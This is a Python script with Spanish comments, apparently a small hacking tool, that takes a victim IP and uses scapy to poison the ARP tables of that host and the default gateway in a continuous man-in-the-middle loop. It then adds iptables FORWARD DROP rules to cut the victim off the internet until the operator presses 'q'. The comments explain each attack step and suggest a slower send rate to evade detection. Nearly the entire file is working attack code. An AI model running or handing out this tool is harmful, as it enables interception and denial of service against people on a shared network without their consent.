#!/usr/bin/env python3


# imports
import threading
import subprocess
import os
import sys
from time import sleep
from scapy.all import ARP, send
from netifaces import gateways, AF_INET
from getmac import get_mac_address

# constantes

# la 'papelera' de linux
DEVNULL = open(os.devnull, 'w')
# direccion de broadcast
BROADCAST = 'ff:ff:ff:ff:ff:ff'


# funcion para realizar un ataque de Man In The Middle clásico (MITM)
def _spoof(host, host_mac, gateway, gateway_mac, interface):
	# enviaremos estos paquetes en intervalos de dos segundos para que funcione mejor, aunque en
	# entoros reales no sería recomendable, puesto que generaríamos muchísimo tráfico ARP y sería
	# facilísimo que nos detecten este ataque :p (subir tiempo de sleep para + discrección)
	while True:
		global stop_spoof
		if (stop_spoof):
			break
		# enviamos un ARP 'hello' al router, diciéndole que la ip del host víctima está asociada a
		# nuestra mac, y a la víctima, diciéndole que ahora somos nosotros su gateway
		packets = [
			ARP(op=2, psrc=host, pdst=gateway, hwdst=gateway_mac),
			ARP(op=2, psrc=gateway, pdst=host, hwdst=host_mac)
		]
		# mandamos los paquetes
		[send(x, verbose=0, iface=interface) for x in packets]
		sleep(2)


# función para devolverle la ip al host víctima
def free(host, host_mac, gateway, gateway_mac, interface):
	# igual que antes, le enviamos un mensaje ARP al router asociando ip de la víctima con su mac original,
	# y otro a la víctima diciéndole quién es el router
	packets = [
		ARP(op=2, psrc=host, hwsrc=host_mac, pdst=gateway, hwdst=BROADCAST),
		ARP(op=2, psrc=gateway, hwsrc=gateway_mac, pdst=host, hwdst=BROADCAST)
	]
	[send(x, verbose=0, iface=interface, count=3) for x in packets]


# comenzamos el script

if (os.getuid()!=0):
	sys.exit("You must be root to run this script!!!")

# parseamos argumentos
if (len(sys.argv) == 2):
	host = sys.argv[1]
else:
    print("Usage: block_host <host_ip>")
    sys.exit()

# obtenemos la ip y mac del router, la mac de la víctima y la interfaz
try:
	host_mac = get_mac_address(ip=host, network_request=True)
	tuple = gateways()['default'][AF_INET]
	gateway = tuple[0]
	interface = tuple[1]
	gateway_mac = get_mac_address(ip=gateway, network_request=True)
except Exception as e:
	print("Exception occured network information.")
	print(e)

try:
	stop_spoof = False
	# lanzamos un thread que haga el envenenamiento de las tablas ARP del router y la víctima
	thread = threading.Thread(target=_spoof, args=[host, host_mac, gateway, gateway_mac, interface], daemon=True)
	thread.start()
	# esperamos un poco, algunos dispositivos viejos pueden tardar bastante en actualizar sus tablas ARP
	sleep(5)
	# una vez hecho el MITM, el único punto de acceso a internet que tendrá la víctima será a través de nosotros, por lo tanto,
	# le estamos haciendo de router
	# para bloquear su acceso a internet sería tan fácil como prohibir que desde esa ip se forwardee nada haciendo uso de un
	# firewall como iptables
	subprocess.call('sudo iptables -t filter -A FORWARD -s {} -j DROP'.format(host), shell=True, stdout=DEVNULL, stderr=DEVNULL)
	subprocess.call('sudo iptables -t filter -A FORWARD -d {} -j DROP'.format(host), shell=True, stdout=DEVNULL, stderr=DEVNULL)
	print("blocked host with ip:"+host+".")
	while True:
		# si queremos volver a dejar a la víctima conectarse a internet presionamos 'q'
		print("Press q to free the blocked host:")
		x = input()
		if (x=="q" or x=="Q"):
			# paramos de spoofear
			stop_spoof = True
			thread.join()
			# liberamos a la víctima
			free(host, host_mac, gateway, gateway_mac, interface)
			print("Host released.")
			sys.exit()
except KeyboardInterrupt:
	stop_spoof = True
	thread.join()
	free(host, host_mac, gateway, gateway_mac, interface)
